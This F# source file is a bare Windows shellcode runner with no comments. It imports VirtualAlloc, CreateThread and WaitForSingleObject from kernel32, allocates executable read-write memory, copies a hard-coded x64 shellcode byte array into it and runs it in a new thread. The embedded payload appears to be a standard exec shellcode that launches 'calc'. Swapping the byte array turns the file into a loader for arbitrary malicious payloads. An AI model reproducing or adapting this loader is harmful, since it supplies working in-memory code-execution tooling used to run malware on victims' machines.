open System
open System.Runtime.InteropServices
open System.Threading

[<DllImport "kernel32" >]
extern nativeint VirtualAlloc(
  nativeint         lpStartAddress,
  uint32            dwSize, 
  uint32            flAllocationType, 
  uint32         flProtect)

[<DllImport "kernel32" >]
extern nativeint CreateThread(
  uint32         lpThreadAttributes,
  uint32            dwStackSize, 
  nativeint            lpStartAddress, 
  uint32&         param,
  uint32         dwCreationFlags,
  uint32&         lpThreadId)

[<DllImport "kernel32" >]
extern nativeint WaitForSingleObject(
  nativeint         hHandle,
  uint32         dwMilliseconds)

  
let mutable threadId : uint32 = (uint32)0
let mutable pInfo : uint32 = (uint32)0
let mutable shellcode : byte[] = [|0xfcuy;0x48uy;0x83uy;0xe4uy;0xf0uy;0xe8uy;0xc0uy;0x00uy;0x00uy;0x00uy;0x41uy;0x51uy;0x41uy;0x50uy;0x52uy;0x51uy;0x56uy;0x48uy;0x31uy;0xd2uy;0x65uy;0x48uy;0x8buy;0x52uy;0x60uy;0x48uy;0x8buy;0x52uy;0x18uy;0x48uy;0x8buy;0x52uy;0x20uy;0x48uy;0x8buy;0x72uy;0x50uy;0x48uy;0x0fuy;0xb7uy;0x4auy;0x4auy;0x4duy;0x31uy;0xc9uy;0x48uy;0x31uy;0xc0uy;0xacuy;0x3cuy;0x61uy;0x7cuy;0x02uy;0x2cuy;0x20uy;0x41uy;0xc1uy;0xc9uy;0x0duy;0x41uy;0x01uy;0xc1uy;0xe2uy;0xeduy;0x52uy;0x41uy;0x51uy;0x48uy;0x8buy;0x52uy;0x20uy;0x8buy;0x42uy;0x3cuy;0x48uy;0x01uy;0xd0uy;0x8buy;0x80uy;0x88uy;0x00uy;0x00uy;0x00uy;0x48uy;0x85uy;0xc0uy;0x74uy;0x67uy;0x48uy;0x01uy;0xd0uy;0x50uy;0x8buy;0x48uy;0x18uy;0x44uy;0x8buy;0x40uy;0x20uy;0x49uy;0x01uy;0xd0uy;0xe3uy;0x56uy;0x48uy;0xffuy;0xc9uy;0x41uy;0x8buy;0x34uy;0x88uy;0x48uy;0x01uy;0xd6uy;0x4duy;0x31uy;0xc9uy;0x48uy;0x31uy;0xc0uy;0xacuy;0x41uy;0xc1uy;0xc9uy;0x0duy;0x41uy;0x01uy;0xc1uy;0x38uy;0xe0uy;0x75uy;0xf1uy;0x4cuy;0x03uy;0x4cuy;0x24uy;0x08uy;0x45uy;0x39uy;0xd1uy;0x75uy;0xd8uy;0x58uy;0x44uy;0x8buy;0x40uy;0x24uy;0x49uy;0x01uy;0xd0uy;0x66uy;0x41uy;0x8buy;0x0cuy;0x48uy;0x44uy;0x8buy;0x40uy;0x1cuy;0x49uy;0x01uy;0xd0uy;0x41uy;0x8buy;0x04uy;0x88uy;0x48uy;0x01uy;0xd0uy;0x41uy;0x58uy;0x41uy;0x58uy;0x5euy;0x59uy;0x5auy;0x41uy;0x58uy;0x41uy;0x59uy;0x41uy;0x5auy;0x48uy;0x83uy;0xecuy;0x20uy;0x41uy;0x52uy;0xffuy;0xe0uy;0x58uy;0x41uy;0x59uy;0x5auy;0x48uy;0x8buy;0x12uy;0xe9uy;0x57uy;0xffuy;0xffuy;0xffuy;0x5duy;0x48uy;0xbauy;0x01uy;0x00uy;0x00uy;0x00uy;0x00uy;0x00uy;0x00uy;0x00uy;0x48uy;0x8duy;0x8duy;0x01uy;0x01uy;0x00uy;0x00uy;0x41uy;0xbauy;0x31uy;0x8buy;0x6fuy;0x87uy;0xffuy;0xd5uy;0xbbuy;0xf0uy;0xb5uy;0xa2uy;0x56uy;0x41uy;0xbauy;0xa6uy;0x95uy;0xbduy;0x9duy;0xffuy;0xd5uy;0x48uy;0x83uy;0xc4uy;0x28uy;0x3cuy;0x06uy;0x7cuy;0x0auy;0x80uy;0xfbuy;0xe0uy;0x75uy;0x05uy;0xbbuy;0x47uy;0x13uy;0x72uy;0x6fuy;0x6auy;0x00uy;0x59uy;0x41uy;0x89uy;0xdauy;0xffuy;0xd5uy;0x63uy;0x61uy;0x6cuy;0x63uy;0x00uy;|]

let address = VirtualAlloc((nativeint)0, (uint32)shellcode.Length, (uint32)0x1000, (uint32)0x40)

Marshal.Copy(shellcode, 0, address, shellcode.Length)
let hThread = CreateThread((uint32)0,(uint32)0, address, &pInfo, (uint32)0, &threadId)
WaitForSingleObject(hThread, (uint32)0xFFFFFFFF) |> ignore

